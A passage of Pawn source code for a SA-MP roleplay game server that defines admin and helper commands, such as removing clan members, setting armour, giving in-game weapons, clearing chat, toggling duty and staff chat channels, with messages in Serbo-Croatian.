	 	format( DialogStrgEx, sizeof( DialogStrgEx ), "Lider 1: %s\nLider 2: %s\nClan 1: %s\nClan 2: %s\nClan 3: %s\nClan 4: %s\nClan 5: %s\nClan 6: %s\nClan 7: %s\nClan 8: %s\nClan 9: %s\nClan 10: %s\nClan 11: %s\nClan 12: %s\nClan 13: %s\nClan 14: %s\nClan 15: %s\nClan 16: %s\nClan 17: %s\nClan 18: %s\nClan 19: %s\nClan 20: %s\nClan 21: %s\nClan 22: %s\nClan 23: %s\nClan 24: %s\nClan 25: %s\nClan 26: %s\nClan 27: %s\nClan 28: %s\nClan 29: %s\nClan 30: %s" ,
		 	OI[ OrgID ][ oLider1 ],
		 	OI[ OrgID ][ oLider2 ],
			OI[ OrgID ][ oClan1 ],
			OI[ OrgID ][ oClan2 ],
		 	OI[ OrgID ][ oClan3 ],
		 	OI[ OrgID ][ oClan4 ],
			OI[ OrgID ][ oClan5 ],
			OI[ OrgID ][ oClan6 ],
			OI[ OrgID ][ oClan7 ],
			OI[ OrgID ][ oClan8 ],
			OI[ OrgID ][ oClan9 ],
			OI[ OrgID ][ oClan10 ],
			OI[ OrgID ][ oClan11 ],
			OI[ OrgID ][ oClan12 ],
			OI[ OrgID ][ oClan13 ],
			OI[ OrgID ][ oClan14 ],
			OI[ OrgID ][ oClan15 ],
			OI[ OrgID ][ oClan16 ],
			OI[ OrgID ][ oClan17 ],
			OI[ OrgID ][ oClan18 ],
			OI[ OrgID ][ oClan19 ],
			OI[ OrgID ][ oClan20 ],
			OI[ OrgID ][ oClan21 ],
			OI[ OrgID ][ oClan22 ],
			OI[ OrgID ][ oClan23 ],
			OI[ OrgID ][ oClan24 ],
			OI[ OrgID ][ oClan25 ],
			OI[ OrgID ][ oClan26 ],
			OI[ OrgID ][ oClan27 ],
			OI[ OrgID ][ oClan28 ],
			OI[ OrgID ][ oClan29 ],
			OI[ OrgID ][ oClan30 ] );
		format( string, sizeof( string ), ""col_white"%s", OI[ OrgID ][ oName ] ) ;
		ShowPlayerDialog( playerid, 0, DSMSG, string, DialogStrgEx, "U redu", "" );
		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
    }
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:offizbaciclana( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] > 5 || PlayerInfo[ playerid ][ xSkriptaRank ] == 4  ) {
        if( PlayerInfo[ playerid ][ xAdmin ] > 5 ) { if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" ); }
        new imeigraca[ 24 ], ifile[ 64 ], OrgID, oFile[ 40 ];
	    if( sscanf( params, "ds[24]", OrgID, imeigraca ) ) return SendUsageMessage( playerid, "/offizbaciclana [ ID organizacije ] [ Ime_Prezime ]." );
        format( ifile, sizeof( ifile ), I_FILE, imeigraca ); format( oFile, sizeof( oFile ), O_FILE, OrgID );
        if( !fexist( oFile ) ) return SendErrorMessage( playerid, "Ova organizacija ne postoji." );
		if( !fexist( ifile ) ) return SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) {
			SendErrorMessage( playerid, "Taj igrac je online tako da izbaci ga online.");
			return 1;
		}

		if( strcmp( imeigraca, OI[ OrgID ][ oClan1 ], true ) == 0) { strmid( OI[ OrgID ][ oClan1], "Niko", 0, strlen( "Niko" ), ORG_CLAN); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan2 ], true ) == 0) { strmid( OI[ OrgID ][ oClan2 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan3 ], true ) == 0) { strmid( OI[ OrgID ][ oClan3 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan4 ], true ) == 0) { strmid( OI[ OrgID ][ oClan4 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan5 ], true ) == 0) { strmid( OI[ OrgID ][ oClan5 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan6 ], true ) == 0) { strmid( OI[ OrgID ][ oClan6 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan7 ], true ) == 0) { strmid( OI[ OrgID ][ oClan7 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan8 ], true ) == 0) { strmid( OI[ OrgID ][ oClan8 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan9 ], true ) == 0) { strmid( OI[ OrgID ][ oClan9 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan10 ], true ) == 0) { strmid( OI[ OrgID ][ oClan10 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan11 ], true ) == 0) { strmid( OI[ OrgID ][ oClan11 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan12 ], true ) == 0) { strmid( OI[ OrgID ][ oClan12 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan13 ], true ) == 0) { strmid( OI[ OrgID ][ oClan13 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan14 ], true ) == 0) { strmid( OI[ OrgID ][ oClan14 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan15 ], true ) == 0) { strmid( OI[ OrgID ][ oClan15 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan16 ], true ) == 0) { strmid( OI[ OrgID ][ oClan16 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan17 ], true ) == 0) { strmid( OI[ OrgID ][ oClan17 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan18 ], true ) == 0) { strmid( OI[ OrgID ][ oClan18 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan19 ], true ) == 0) { strmid( OI[ OrgID ][ oClan19 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan20 ], true ) == 0) { strmid( OI[ OrgID ][ oClan20 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan21 ], true ) == 0) { strmid( OI[ OrgID ][ oClan21 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan22 ], true ) == 0) { strmid( OI[ OrgID ][ oClan22 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan23 ], true ) == 0) { strmid( OI[ OrgID ][ oClan23 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan24 ], true ) == 0) { strmid( OI[ OrgID ][ oClan24 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan25 ], true ) == 0) { strmid( OI[ OrgID ][ oClan25 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan26 ], true ) == 0) { strmid( OI[ OrgID ][ oClan26 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan27 ], true ) == 0) { strmid( OI[ OrgID ][ oClan27 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan28 ], true ) == 0) { strmid( OI[ OrgID ][ oClan28 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan29 ], true ) == 0) { strmid( OI[ OrgID ][ oClan29 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan30 ], true ) == 0) { strmid( OI[ OrgID ][ oClan30 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else return SendErrorMessage( playerid, "Taj igrac nije u izabranoj organizaciji!" );

        OI[ OrgID ][ oUbacenihClanova ]--;

	    new INI:File = INI_Open( ifile );
		INI_SetTag( File, "Informacije" );
		INI_WriteInt( File, "Clan", 0 );
		INI_WriteInt( File, "Rank", 0 );
		INI_WriteInt( File, "OrgUgovor", 0 );
		INI_WriteInt( File, "Skin", MuskiSkinoviID[0][0]);
		INI_WriteInt( File, "Spawn", 0 );
		INI_Close( File );
        SaveOrganization( OrgID );
		SendClientMessageEx( playerid, CRVENA, "Izbacili ste igraca %s iz organizacije %s", imeigraca, OI[ OrgID ][ oName ] );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:armorall(playerid) {

    if( PlayerInfo[ playerid ][ xAdmin ] >= 5  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

        foreach(Player, i) {

            Novi_SetPlayerArmour( i, 100 );
        }

        SendInfoMessage( playerid, "Dao si svim igracima pancir." );
        format( globalstring, sizeof( globalstring ), ""col_crvena"V-RP | "col_white" Admin %s je dao svim igracima pancir.", ImeIgraca( playerid ) );
        SCMA( -1, globalstring );
    }
    else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

    return 1;
}

alias:setarmor("postaviarmor");
CMD:setarmor( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1  ) {
        if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
		new id, zivot;
		if( sscanf( params, "ui", id, zivot ) ) return SendUsageMessage( playerid, "/setarmor [ ID/Deo imena ] [ Helti ]." );
		if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac je offline!");
		if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 6 ) return SendErrorMessage( playerid, "Ne mozete to directorima i ownerima!" );
		Novi_SetPlayerArmour( id, zivot );
		SendInfoMessage( id, "Admin %s vam je postavio armor na %d.", ImeIgraca( playerid ), zivot );
		SendInfoMessage( playerid, "Postavili ste igracu %s armor na %d.", ImeIgraca( id ), zivot );
	    format( globalstring, sizeof( globalstring ), "SETARMOR | %s je postavio armor igracu %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
	   	AdminPoruka( NARACRVENA, globalstring );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:cc( playerid, params[], help) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
		for( new j; j < 110; j++ ) {
			SendClientMessageToAll( -1, "" );
		}
		new string[128];
		if( PlayerInfo[ playerid ][ xAdmin ] == 7 ) { format( string, sizeof( string ), ""SRVBOJA1SCM"Vlasnik "SRVBOJA1SCM"%s "SRVBOJA1SCM"je ocistio chat.", ImeIgraca( playerid ) ); }
		else if( PlayerInfo[ playerid ][ xAdmin ] == 6 ) { format( string, sizeof( string ), ""SRVBOJA1SCM"Suvlasnik "SRVBOJA1SCM"%s "SRVBOJA1SCM"je ocistio chat.", ImeIgraca( playerid ) ); }
		else if( PlayerInfo[ playerid ][ xAdmin ] == 5 ) { format( string, sizeof( string ), ""SRVBOJA1SCM"Head Admin "SRVBOJA1SCM"%s "SRVBOJA1SCM"je ocistio chat.", ImeIgraca( playerid ) ); }
		else if( PlayerInfo[ playerid ][ xAdmin ] >= 1 && PlayerInfo[ playerid ][ xAdmin ] <= 4 ) { format( string, sizeof( string ), ""SRVBOJA1SCM"Admin "SRVBOJA1SCM"%s "SRVBOJA1SCM"je ocistio chat.", ImeIgraca( playerid ) ); }
		else if( PlayerInfo[ playerid ][ xSupporter ] >= 1 ) { format( string, sizeof( string ), ""SRVBOJA1SCM"Helper "SRVBOJA1SCM"%s "SRVBOJA1SCM"je ocistio chat.", ImeIgraca( playerid ) ); }
		SendClientMessageToAll(-1, string);
		SendClientMessageToAll( -1, "=== www."SRVBOJA1SCM"valhalla-ogc"col_white".com ===");
		
	}
	else return SendErrorMessage( playerid, "Niste ovlasteni za KORISTI ove komande!");
	return 1;
}

alias:givegun("dajoruzje", "aoruzje");
CMD:givegun( playerid, params[] ) {
	new playa, gun, ammo;
	if( sscanf( params, "uii", playa, gun, ammo ) ) {
		SendUsageMessage( playerid, "/givegun [ ID/Deo imena ] [weaponid(eg. 46 = Parachute)] [ammo]");
		SCM( playerid, 0xAFAFAFAA, "1(Brass Knuckles) 2(Golf Club) 3(Nite Stick) 4(Knife) 5(Baseball Bat) 6(Shovel) 7(Pool Cue) 10-13(Dildo) 14(Flowers) 15(Cane) 22(Pistol) 23(Silence Pistol)");
		SCM( playerid, 0xAFAFAFAA, "24(Desert Eagle) 25(Shot Gun) 29(MP5) 30(AK47) 31(M4) 33(Country Rifle) 34(Sniper Rifle) 41(Spray Can) 42(Fire Extinguisher) 43(Camera) 46(Parachute)");
		return 1;
    }
	if(gun < 1 || gun > 46 )
	{ SendErrorMessage( playerid, "Krivi WeaponID!"); return 1; }
	if( ammo <1 || ammo > 999 )
	{ SendErrorMessage( playerid, "Neidi ispod 1 ili 999 metaka!"); return 1; }
	if( PlayerInfo[ playerid ][ xAdmin ] >= 5 ) {
	    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	    if( IsPlayerConnected( playa ) ) {
	        if( playa != INVALID_PLAYER_ID ) {
	            if( PlayerInfo[playa][ xLevel ] < 2) {
				    SCM( playerid, CRVENA, "Igrac nije level 2!!");
					return 1;
				}
                if(isForbidenWeapon(gun)) return SendErrorMessage(playerid, "Ne mozes davati zabranjena oruzija!");
				GiveWeaponToPlayer( playa, gun, ammo );
				SendInfoMessage( playa, "Admin %s ti je dao oruzje %s.", ImeIgraca( playerid ), WeaponInfos[ gun ][ wName ] );
				SendInfoMessage( playerid, "Dao si oruzje %s igracu %s.", WeaponInfos[ gun ][ wName ], ImeIgraca( playa ) );

                new string1[ 128 ];
                format( string1, sizeof( string1 ), "Admin %s je dao oruzije %s sa %d metkova igracu %s", ImeIgraca( playerid ), WeaponInfos[ gun ][ wName ], ammo, ImeIgraca(playa));
                LogSave( "Ostalo/LogPickupGun.log", string1 );
			}
		}
	} else SendErrorMessage( playerid, "Niste ovlasteni za KORISTI ove komande!");
	return 1;
}

CMD:aduty( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( AdminDuty[ playerid ] == false )
 	{

  		SetPlayerColor( playerid, AdminBoja );

        if(PlayerInfo[playerid][xAdmin] == 7) SetPlayerColor(playerid, VlasnikBoja);
        if(PlayerInfo[playerid][xAdmin] == 6) SetPlayerColor(playerid, VlasnikBoja);
        if(PlayerInfo[playerid][xAdmin] == 5) SetPlayerColor(playerid, SuvlasnikBoja);

		Novi_SetPlayerHealth( playerid, 150);
		Novi_SetPlayerArmour( playerid, 99);

		PostaviSkin(playerid, 294);
		
		AdminDuty[ playerid ] = true;
		defer AdminDutyTimer(playerid);
	   	va_SendClientMessageToAll(-1, ""col_white"Admin "SRVBOJA1SCM"%s(Duty: %d min)"col_white" je sada na duznosti /report", ImeIgraca(playerid), PlayerInfo[playerid][xAdminDuty]);		
	}
	else if(AdminDuty[playerid] == true)
	{
	    PostaviSkin(playerid,PlayerInfo[ playerid ][ xSkin ]);
        SetPlayerColor( playerid, 0xFFFFFF00 );
		
	 	AdminDuty[playerid] = false;
	 	va_SendClientMessageToAll(-1, ""col_white"Admin "SRVBOJA1SCM"%s(Duty: %d min)"col_white" je sada van duznosti", ImeIgraca(playerid), PlayerInfo[playerid][xAdminDuty]);
	}
    return true;
}
alias:aduty("adminduty", "aon");

CMD:hduty(playerid) {

    if( PlayerInfo[ playerid ][ xSupporter ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( !AdminDuty[ playerid ] ) {

        SetPlayerColor( playerid, 0x8EFF00FF );
        Novi_SetPlayerHealth( playerid, 150 );
        Novi_SetPlayerArmour( playerid, 99 );
        //if( PlayerInfo[ playerid ][ xPol ] == 1 ) PostaviSkin( playerid, 59 );
        
        SendInfoMessage( playerid, "Sada si Helper na duznosti." );
        AdminDuty[ playerid ] = true;
        defer AdminDutyTimer(playerid);
        format( globalstring, sizeof( globalstring ), "Helper %s(Duty: %d min) je sada na duznosti.", ImeIgraca( playerid ), PlayerInfo[playerid][xAdminDuty] );
        RPTChat( SUPPORTER, globalstring );
        return 1;
    }
    else if( AdminDuty[ playerid ] ) {
        SetPlayerColor( playerid, 0xFFFFFF00 );
        Novi_SetPlayerHealth( playerid, 40);
        Novi_SetPlayerArmour( playerid, 0);
        //PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
        
        SCM( playerid, CRVENA, "Vise nisi helper na duznosti." );
        AdminDuty[ playerid ] = false;
        format( globalstring, sizeof( globalstring ), "Helper %s(Duty: %d min) vise nije na duznosti.", ImeIgraca( playerid ), PlayerInfo[playerid][xAdminDuty] );
        RPTChat( SUPPORTER, globalstring );
        return 1;
    }
    return 1;
}
alias:hduty("helperduty", "hon");

CMD:l( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if(PlayerInfo[playerid][xLider] == 0) return SendErrorMessage(playerid, "Samo lideri!");
    new text[ 128 ], string1[180];
    if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/l [ tekst ]." );

    format( string1, sizeof( string1 ), "{DEC4DE}[L] ( %s ) {FBC800}%s: "col_white"%s", OI[PlayerInfo[playerid][xLider]][oPreFix], ImeIgraca(playerid), text);
    
    foreach( Player, i ) {

        if( PlayerInfo[ i ][ xLider ] != 0 ) {

            SCM(i, -1, string1);
        } 
    }
    
    new string[ 128 ]; 
    format( string, sizeof( string ), "(/l)Lider %s: %s", ImeIgraca( playerid ), text );
    LogSave( "Ostalo/LogLiderChat.log", string );
    return true;
}

CMD:ao( playerid, params[], help) {
   	if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    // if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
    new aotext[ 128 ], string1[ 234 ];
    if( sscanf( params, "s[128]", aotext ) ) return SendUsageMessage( playerid, "/ao [ Text ]");

    if( PlayerInfo[ playerid ][ xSkriptaRank ] == 1 ) {
		format( string1, sizeof( string1 ), ""col_splava"(( Developer %s: "col_white"%s "col_splava"))", ImeIgraca( playerid ), aotext );
	}
	else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 2 ) {
		format( string1, sizeof( string1 ), ""col_splava"(( Co Developer %s: "col_white"%s "col_splava"))", ImeIgraca( playerid ), aotext );
	}
	else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 3 ) {
		format( string1, sizeof( string1 ), ""col_splava"(( Mapper %s: "col_white"%s "col_splava"))", ImeIgraca( playerid ), aotext );
	}
	else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 6 ) {
		format( string1, sizeof( string1 ), ""col_splava"(( Suvlasnik %s: "col_white"%s "col_splava"))", ImeIgraca( playerid ), aotext );
	}
    else if( PlayerInfo[ playerid ][ xAdmin ] == 7 ) {
	    format( string1, sizeof( string1 ), ""col_splava"(( Vlasnik %s: "col_white"%s "col_splava"))", ImeIgraca( playerid ), aotext );
	}
	else if( PlayerInfo[ playerid ][ xAdmin ] == 6 ) {
	    format( string1, sizeof( string1 ), ""col_splava"(( Suvlasnik %s: "col_white"%s "col_splava"))", ImeIgraca( playerid ), aotext );
	}
	else if( PlayerInfo[ playerid ][ xAdmin ] == 5 ) {
	    format( string1, sizeof( string1 ), ""col_splava"(( Head Admin %s: "col_white"%s "col_splava"))", ImeIgraca( playerid ), aotext );
	}
	else if( PlayerInfo[ playerid ][ xAdmin ] == 4 ) {
	    format( string1, sizeof( string1 ), ""col_splava"(( Administrator %s: "col_white"%s "col_splava"))", ImeIgraca( playerid ), aotext );
	}
	else if( PlayerInfo[ playerid ][ xAdmin ] == 3 ) {
	    format( string1, sizeof( string1 ), ""col_splava"(( Administrator %s: "col_white"%s "col_splava"))", ImeIgraca( playerid ), aotext );
	}
	else if( PlayerInfo[ playerid ][ xAdmin ] == 2 ) {
	    format( string1, sizeof( string1 ), ""col_splava"(( Administrator %s: "col_white"%s "col_splava"))", ImeIgraca( playerid ), aotext );
	}
	else if( PlayerInfo[ playerid ][ xAdmin ] == 1 ) {
	    format( string1, sizeof( string1 ), ""col_splava"(( Administrator %s: "col_white"%s "col_splava"))", ImeIgraca( playerid ), aotext );
	}

	
	SCMA( CRVENA, string1 );
	new string[ 128 ]; 
	format( string, sizeof( string ), "Admin %s: %s", ImeIgraca( playerid ), aotext );
	LogSave( "Ostalo/LogOChat.log", string );
	return 1;
}

CMD:ho( playerid, params[], help) {
   	if( PlayerInfo[ playerid ][ xSupporter ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    new aotext[ 128 ], string1[ 234 ];
    if( sscanf( params, "s[128]", aotext ) ) return SendUsageMessage( playerid, "/ho [ Text ]");

	if( PlayerInfo[ playerid ][ xSupporter ] == 3 ) {
		format( string1, sizeof( string1 ), "(( Head Helper %s: %s ))", ImeIgraca( playerid ), aotext );
	}
	else if( PlayerInfo[ playerid ][ xSupporter ] >= 1 && PlayerInfo[ playerid ][ xSupporter ] <= 2 ) {
		format( string1, sizeof( string1 ), "(( Helper %s: %s ))", ImeIgraca( playerid ), aotext );
	}
	SCMA( SUPPORTER, string1 );

	new string[ 128 ]; 
	format( string, sizeof( string ), "Helper %s: %s", ImeIgraca( playerid ), aotext );
	LogSave( "Ostalo/LogGOChat.log", string );
	return 1;
}

CMD:a( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	new text[ 128 ], string1[180];
    if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/a [ tekst ]." );
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

    if( PlayerInfo[ playerid ][ xSkriptaRank ] == 1 ) {
		format( string1, sizeof( string1 ), "[A] [DEVELOPER] %s: "col_white"%s", ImeIgraca( playerid ), text );
	}
	else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 2 ) {
		format( string1, sizeof( string1 ), "[A] [CO DEVELOPER] %s: "col_white"%s", ImeIgraca( playerid ), text );
	}
	else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 3 ) {
		format( string1, sizeof( string1 ), "[A] [MAPPER] %s: "col_white"%s", ImeIgraca( playerid ), text );
	}
	else if( PlayerInfo[ playerid ][ xAdmin ] == 7 ) {
	    format( string1, sizeof( string1 ), "[A] [VLASNIK] %s: "col_white"%s", ImeIgraca( playerid ), text );
	}
    else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 6 ) {
        format( string1, sizeof( string1 ), "[A] [SUVLASNIK] %s: "col_white"%s", ImeIgraca( playerid ), text );
    }
	else if( PlayerInfo[ playerid ][ xAdmin ] == 6 ) {
	    format( string1, sizeof( string1 ), "[A] [SUVLASNIK] %s: "col_white"%s", ImeIgraca( playerid ), text );
	}
	else if( PlayerInfo[ playerid ][ xAdmin ] == 5 ) {
	    format( string1, sizeof( string1 ), "[A] [HEAD ADMIN] %s: "col_white"%s", ImeIgraca( playerid ), text );
	}
	else if( PlayerInfo[ playerid ][ xAdmin ] == 4 ) {
	    format( string1, sizeof( string1 ), "[A] [ADMINISTRATOR] %s: "col_white"%s", ImeIgraca( playerid ), text );
	}
	else if( PlayerInfo[ playerid ][ xAdmin ] == 3 ) {
	    format( string1, sizeof( string1 ), "[A] [ADMINISTRATOR] %s: "col_white"%s", ImeIgraca( playerid ), text );
	}
	else if( PlayerInfo[ playerid ][ xAdmin ] == 2 ) {
	    format( string1, sizeof( string1 ), "[A] [ADMINISTRATOR] %s: "col_white"%s", ImeIgraca( playerid ), text );
	}
	else if( PlayerInfo[ playerid ][ xAdmin ] == 1 ) {
	    format( string1, sizeof( string1 ), "[A] [ADMINISTRATOR] %s: "col_white"%s", ImeIgraca( playerid ), text );
	}
	
	AdminPoruka( VlasnikBoja, string1 );
	new string[ 128 ]; 
	format( string, sizeof( string ), "Admin %s: %s", ImeIgraca( playerid ), text );
	LogSave( "Ostalo/LogAdminChat.log", string );
	return true;
}

CMD:h( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
	if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	new text[ 128 ], string1[180];
    if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/h [ tekst ]." );
	if( PlayerInfo[ playerid ][ xSupporter ] >= 1 || PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[playerid][xSpecAdmin] == 1) {

        if( PlayerInfo[ playerid ][ xSkriptaRank ] == 1 ) {
			format( string1, sizeof( string1 ), "[H] |DEVELOPER| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 2 ) {
			format( string1, sizeof( string1 ), "[H] |CO DEVELOPER| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 3 ) {
			format( string1, sizeof( string1 ), "[H] |MAPPER| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xAdmin ] == 7 ) {
			format( string1, sizeof(string1), "[H] |VLASNIK| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
        else if( PlayerInfo[ playerid ][ xSkriptaRank ] == 6 ) {
            format( string1, sizeof( string1 ), "[H] |SUVLASNIK| %s: "col_white"%s", ImeIgraca( playerid ), text );
        }
		else if( PlayerInfo[ playerid ][ xAdmin ] == 6 ) {
			format( string1, sizeof(string1), "[H] |SUVLASNIK| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
        else if( PlayerInfo[ playerid ][ xAdmin ] == 5 ) {
            format( string1, sizeof(string1), "[H] |HEAD ADMIN| %s: "col_white"%s", ImeIgraca( playerid ), text );
        }
		else if( PlayerInfo[ playerid ][ xAdmin ] == 4 ) {
	    	format( string1, sizeof( string1 ), "[H] |ADMINISTRATOR| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xAdmin ] == 3 ) {
		    format( string1, sizeof( string1 ), "[H] |ADMINISTRATOR| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xAdmin ] == 2 ) {
		    format( string1, sizeof( string1 ), "[H] |ADMINISTRATOR| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xAdmin ] == 1 ) {
		    format( string1, sizeof( string1 ), "[H] |ADMINISTRATOR| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xSpecAdmin] == 1)
		{
			format( string1, sizeof(string1), "[H] |SPEC|ADMIN| %s: "col_white"%s", ImeIgraca( playerid ), text );
		}
		else if( PlayerInfo[ playerid ][ xSupporter ] == 3 ) {
            format( string1, sizeof(string1), "[H] |H|HEAD| %s: "col_white"%s", ImeIgraca( playerid ), text );
        }
		else if( PlayerInfo[ playerid ][ xSupporter ] >= 1 && PlayerInfo[ playerid ][ xSupporter ] <= 2 ) {
            format( string1, sizeof(string1), "[H] |H|%d| %s: "col_white"%s", PlayerInfo[ playerid ][ xSupporter ], ImeIgraca( playerid ), text );
        }
		RPTChat( SUPPORTER, string1 );
		new string[ 128 ]; 
		format( string, sizeof( string ), "Admin/Helper %s: %s", ImeIgraca( playerid ), text );
		LogSave( "Ostalo/LogAGSChat.log", string );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return true;
}

CMD:pc( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
	if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	new text[ 128 ], string1[180];
    if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/pc [ tekst ]." );
